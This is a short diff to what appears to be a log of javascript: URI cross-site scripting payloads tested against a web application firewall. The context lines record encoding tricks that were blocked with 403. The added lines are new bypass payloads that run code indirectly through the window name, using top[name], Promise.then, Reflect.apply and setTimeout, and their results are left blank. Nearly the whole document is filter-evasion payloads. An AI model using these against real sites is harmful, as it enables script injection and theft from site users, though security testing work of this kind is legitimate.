@@ -12,3 +12,8 @@ javascript:location='https://…' → 403
 javascript:alert(1) → 403 (unicode escapes)
 java%E2%80%8Bscript:alert(1) → 403 (zero-width space)
 java%C0%80script:alert(1) → 403 (overlong UTF-8)
+javascript:top[name](1) → 
+javascript:[name].forEach(top[name]) → 
+javascript:Promise.resolve(name).then(top[name]) → 
+javascript:Reflect.apply(top[name],null,[1]) → 
+javascript:top["setTimeout"](name)
